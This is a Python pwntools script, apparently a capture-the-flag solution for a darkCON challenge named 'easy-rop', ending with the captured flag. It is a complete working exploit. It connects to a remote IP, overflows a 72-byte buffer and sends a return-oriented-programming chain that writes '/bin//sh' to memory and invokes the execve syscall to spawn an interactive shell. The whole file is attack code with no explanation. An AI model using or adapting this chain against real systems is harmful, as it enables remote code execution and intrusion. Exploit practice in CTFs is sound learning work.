
from pwn import *

# r = process('./easy-rop')
r = remote('65.1.92.179', 49153)

poprax = 0x4175eb #: pop rax; ret;
poprdi = 0x40191a #: pop rdi; ret; 
poprsi = 0x40f4be #: pop rsi; ret;
poprdx = 0x40181f #: pop rdx; ret;
syscall = 0x41e394 #: syscall; ret;
movrdi = 0x44daef #: mov qword ptr [rdi], rsi; ret;

buffor = 0x4c0000
binsh  = b'/bin//sh'

def wrape(addr, s):
	return b''.join([
		p64(poprdi),
		p64(addr),
		p64(poprsi),
		p64(u64(s)),
		p64(movrdi)
		])

p = b'A' * 72
p += wrape(buffor, binsh)
p += p64(poprax)
p += p64(0x3b)
p += p64(poprsi)
p += p64(0x0)
p += p64(poprdx)
p += p64(0x0)
p += p64(syscall)

r.recvuntil('name:')
r.sendline(p)

r.interactive()

# darkCON{w0nd3rful_m4k1n9_sh3llc0d3_us1n9_r0p!!!}